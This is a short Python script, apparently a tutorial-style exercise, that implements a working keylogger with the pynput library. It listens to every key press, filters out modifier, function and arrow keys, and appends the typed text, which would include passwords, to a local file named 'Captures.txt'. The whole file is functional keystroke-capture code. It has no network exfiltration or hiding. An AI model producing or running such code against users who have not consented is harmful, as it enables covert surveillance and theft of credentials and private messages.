from pynput.keyboard import Listener


def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

# KeyBoard Exception Cases

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift':
        letter = ''
    if letter == 'Key.shift_r':
        letter = ''
    if letter == 'Key.tab':
        letter = ''
    if letter == 'Key.alt_l':
        letter = ''
    if letter == 'Key.alt_gr':
        letter = ''
    if letter == 'Key.ctrl_l':
        letter = ''
    if letter == 'Key.ctrl_r':
        letter = ''
    if letter == 'Key.caps_lock':
        letter = ''
    if letter == "Key.backspace":
        letter = ""
    if letter == "Key.home":
        letter = ""
    if letter == "Key.end":
        letter = ""
    if letter == "Key.insert":
        letter = ""
    if letter == "Key.delete":
        letter = ""
    if letter == "Key.esc":
        letter = ""
    if letter == "Key.print_screen":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"

# Function Key Exception Cases
    if letter == "Key.f1":
        letter = ""
    if letter == "Key.f2":
        letter = ""
    if letter == "Key.f3":
        letter = ""
    if letter == "Key.f4":
        letter = ""
    if letter == "Key.f5":
        letter = ""
    if letter == "Key.f6":
        letter = ""
    if letter == "Key.f7":
        letter = ""
    if letter == "Key.f8":
        letter = ""
    if letter == "Key.f9":
        letter = ""
    if letter == "Key.f10":
        letter = ""
    if letter == "Key.f11":
        letter = ""
    if letter == "Key.f12":
        letter = ""

# Arrow Key Exception Cases
    if letter == "Key.right":
        letter = ""
    if letter == "Key.left":
        letter = ""
    if letter == "Key.up":
        letter = ""
    if letter == "Key.down":
        letter = ""


    with open("Captures.txt", 'a') as f:
        f.write(letter)

# Collecting events until stopped

with Listener(on_press=write_to_file) as l:
    l.join()


# 'with' will automatically close the listener. When we stop the program the memory allocated
# to this listener won't be released. 'with' makes sure whatever happens, when an error is there
# or the program stops the memory is released. It's just a good coding principle to follow